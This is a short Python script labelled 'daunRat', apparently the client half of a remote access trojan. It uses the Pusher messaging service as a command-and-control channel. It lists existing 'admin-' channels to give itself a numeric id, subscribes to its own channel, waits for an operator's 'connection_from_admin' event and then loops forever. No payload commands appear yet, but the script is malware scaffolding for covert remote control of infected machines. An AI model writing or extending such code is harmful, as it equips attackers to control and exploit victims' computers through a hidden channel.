from env import *
import pusher
import pysher
import json


client_id = int()


client = pusher.Pusher(
    app_id=app_id,
    key=key,
    secret=secret,
    cluster=cluster,
    ssl=True
)
receiver = pysher.Pusher(key=key, cluster=cluster)


def handle_connection_to_server(connection):
    global client_id
    print("Connected to server")
    print("Server returned: " + str(connection))
    try:
        client_id = str(int(list(client.channels_info(prefix_filter='admin-')['channels'])[-1].split('-')[-1]) + 1)
    except IndexError:
        client_id = '0'
    channel = receiver.subscribe('admin-' + client_id)
    print("Client id: " + client_id)
    channel.bind('connection_from_admin', lambda _: print("Connection from admin"))


if __name__ == '__main__':
    print("daunRat by ANONYMUSSSS")
    receiver.connection.bind('pusher:connection_established', handle_connection_to_server)
    receiver.connect()
    while True:
        pass
